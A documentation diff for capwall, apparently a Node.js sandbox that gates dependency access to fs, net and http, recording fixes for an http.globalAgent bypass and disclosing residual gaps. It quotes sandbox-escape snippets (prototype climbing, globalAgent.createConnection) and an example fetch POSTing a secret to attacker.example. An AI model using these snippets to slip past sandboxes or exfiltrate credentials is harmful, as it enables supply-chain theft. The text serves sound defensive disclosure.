@@ -118,7 +118,9 @@ Per-capability notes:
   mediated — consistent with the fd-escape exclusion below.
 - **`net`/`http`/`https`/`tls`/`http2`/`dgram`** — **egress only**. Mediated: `net.connect`/
   `createConnection` **and** `new net.Socket().connect()`; `http(s).request`/`get` **and**
-  `new http.ClientRequest()`; `tls.connect` and `new tls.TLSSocket().connect()`;
+  `new http.ClientRequest()`; `http(s).Agent#createConnection`, on both a caller-built agent and
+  the pre-built `http(s).globalAgent` **instance** (#65 — see "Capability-bearing instances"
+  below); `tls.connect` and `new tls.TLSSocket().connect()`;
   `http2.connect`; and `dgram` socket `send`/`connect` (UDP). Each core egress module is
   shimmed separately on purpose: capwall's require patch only affects `Module._load`-routed
   requires (user/dependency code); Node's own HTTP client loads `net` through the internal
@@ -137,7 +139,11 @@ Per-capability notes:
   guarded via a **guarded subclass** whose prototype method (or constructor) runs the check,
   so `new Cls()`, `(instance).constructor`, `Cls.prototype.constructor`, and
   `Cls.prototype.method.call(...)` are all covered (a construct-trap Proxy would not be — see
-  "Capability-bearing classes" below). The getter-based TOCTOU tracked as #26 and
+  "Capability-bearing classes" below). The pre-built `http(s).globalAgent` **instances** are
+  guarded too, as of #65 — before that fix they were live `Agent` objects the shim copied
+  through verbatim, so `http.globalAgent.createConnection({host, port})` opened a socket with no
+  check and, worse, **no recorded decision**: `observe` and `capwall diff` could not see it
+  either. See "Capability-bearing instances" below. The getter-based TOCTOU tracked as #26 and
   #56 — a package with a narrow net grant supplying an options object (or a `URL` instance)
   whose destination-deciding fields were accessor properties returning the granted value when
   capwall derived the guarded target and a different value when Node itself re-read them — is
@@ -166,12 +172,13 @@ Per-capability notes:
   to dial is itself capwall-mediated — the same class as the pre-install capture residual below.
   (c) `dns` lookups are not mediated (a lookup moves no payload; DNS tunneling is a
   determined-attacker technique out of scope), so a granted host name resolving to an attacker's
-  address is not caught here. (d) Reaching the real prototype by climbing past the guarded
-  subclass (two levels from an instance,
-  `Object.getPrototypeOf(Object.getPrototypeOf(sock)).connect`, or equivalently one hop from
-  the class object, `net.Socket.prototype.__proto__.connect`) — the same class as the general
-  shim un-patching residual, in-process code deliberately climbing above the guard. These are
-  documented residuals, not silent gaps.
+  address is not caught here. (d) Reaching the real prototype by climbing past the guard — two
+  levels from an instance of a guarded class
+  (`Object.getPrototypeOf(Object.getPrototypeOf(sock)).connect`), equivalently one hop from the
+  class object (`net.Socket.prototype.__proto__.connect`), or one hop from a guarded *instance*
+  view (`Object.getPrototypeOf(http.globalAgent).createConnection.call(agent, opts)`) — the same
+  class as the general shim un-patching residual, in-process code deliberately climbing above the
+  guard. These are documented residuals, not silent gaps.
 
   An IPv6 literal is guarded, recorded, and matched **unbracketed** (`::1`, the form Node
   dials); see `docs/policy-format.md`.
@@ -236,6 +243,53 @@ built by the real builtin's own factories. That covers `fs.ReadStream`/`WriteStr
 `File*Stream` aliases), `vm.Script`/`SourceTextModule`/`SyntheticModule`,
 `worker_threads.Worker`, `net.Socket`, `tls.TLSSocket`, `http(s).ClientRequest`,
 `http(s).Agent`, `dgram.Socket`, and `child_process.ChildProcess`.
+
+That `Symbol.hasInstance` override checks its **receiver** before answering permissively (#71).
+The method is inherited down the static chain, so a dependency writing the entirely ordinary
+`class Mine extends net.Socket {}` used to get a subclass that reported `someUnrelatedRealSocket
+instanceof Mine === true`, where un-shimmed Node says `false`. That was a correctness deviation
+rather than a bypass, but silently inverting a package's type dispatch is not a thing a security
+tool should do; the override now falls back to ordinary prototype-chain semantics for any
+receiver that is not the guarded class itself, and one shared implementation
+(`shims/runtime.ts`) serves every guarded class.
+
+**Capability-bearing instances are guarded views (#65).** A builtin namespace does not only
+export functions and classes — it can export a live, pre-built **instance** that already carries
+the capability, and each shim's namespace-copy loop duplicated those through with their real
+methods intact. `http.globalAgent`/`https.globalAgent` were exactly that: any dependency could
+call `http.globalAgent.createConnection({host, port})` and connect under a deny-all `enforce`
+policy, with **no log line** — the unlogged part being the worse half, since egress is the
+payload step of the attack class capwall exists to contain and `observe`/`capwall diff` could
+not surface it. Both are now wrapped in a guarded **view**: a `Proxy` that forwards every read
+and write to the one real agent (so the shared, process-global connection pool, `maxSockets`,
+keep-alive, `agent.sockets` and `instanceof` all keep working — `globalAgent` is on the default
+path for nearly every HTTP call) and replaces only `createConnection`, which is gated with the
+same resolver the guarded `Agent` subclass uses.
+
+A `Proxy` is the right tool *here* and remains the wrong one for a class: the #64 objection is
+that a proxied class's `.prototype.constructor` is the real class, and an instance has no
+`.prototype` to leak through. The alternatives were worse — a freshly constructed guarded agent
+would be a *different* pool (so `http.globalAgent.maxSockets = N` would silently stop affecting
+real requests), and patching the real instance's method would mutate a **process-global that
+outlives `uninstall()`**, which is the same constraint that keeps real builtins unfrozen.
+
+The audit behind #65 walked every object-valued export of every shimmed namespace on Node 20 and
+22. `http.globalAgent` and `https.globalAgent` were the only capability-bearing ones; the rest
+are inert data (`fs.constants`, `http.METHODS`, `http.STATUS_CODES`, `tls.rootCertificates`,
+`http2.constants`, `vm.constants`, `worker_threads.resourceLimits`) or an already-shimmed
+sub-namespace (`fs.promises`).
+
+**Global egress surfaces are NOT mediated, and are not claimed to be.** capwall intercepts
+*module* surfaces — what `require`/`import` hands back. Node's built-in global egress APIs never
+route through a module load, so they are outside the mechanism entirely: `globalThis.fetch`,
+`globalThis.WebSocket` (and `http.WebSocket`, which on Node ≥22 is the same object re-exported
+onto the `http` namespace — shimming that copy alone would buy nothing), and `EventSource`. A
+dependency that calls `fetch("https://attacker.example/", {method:"POST", body: secret})` is
+neither gated nor logged. This is a real gap in egress coverage, not a determined-attacker
+residual: it needs no reflection and no knowledge of capwall. Until it is closed, treat capwall's
+egress control as covering the `net`/`http`/`https`/`tls`/`http2`/`dgram` module surfaces only,
+and pair it with network-level egress control (container/OS firewall) if the global APIs matter
+to your threat model.
 
 The earlier approach for some of those sites was a construct-trap `Proxy`, which **did not
 hold**: a `Proxy` forwards property reads to its target, so the proxied class's `.prototype`
@@ -352,7 +406,9 @@ When a package's declared capabilities are tight, capwall denies (in `enforce` m
 (in `observe` mode) attempts by that package to:
 
 - Read/write files outside its allowed path globs (`fs`).
-- Open network connections to hosts/ports outside its allowlist (`net`, `http(s)`).
+- Open network connections to hosts/ports outside its allowlist **through the `net`, `http(s)`,
+  `tls`, `http2` and `dgram` module surfaces**. Node's global egress APIs (`fetch`, `WebSocket`)
+  are *not* mediated — see "Global egress surfaces" above.
 - Spawn subprocesses when `child_process` is not permitted (**gating** the spawn).
 - Spin up `worker_threads` when not permitted.
 - Read `process.env` keys outside its allowlist (e.g. exfiltrating `AWS_SECRET_ACCESS_KEY`
@@ -390,6 +446,9 @@ frozen primordials, a **determined in-process attacker** can defeat it via, amon
   path specifically, **hijacking the loader-hook chain** is a second route with the same
   disables-it-for-everyone property; it is now gated and logged rather than silent, but not
   closed — see "Loader-hook registration (#61)" above for exactly what remains.
+- **Global egress APIs** — `fetch`, `WebSocket` and friends are globals, not module exports, so
+  the loader-interception mechanism never sees them. See "Global egress surfaces" above; this
+  one is cheap for an attacker, unlike most entries on this list.
 - **fd / symlink escapes** — using an already-open file descriptor, or a symlink, to reach a
   path outside the allowed globs.
 - **`vm` / `eval` / `node:sqlite`** and similar reflective or alternate-execution surfaces
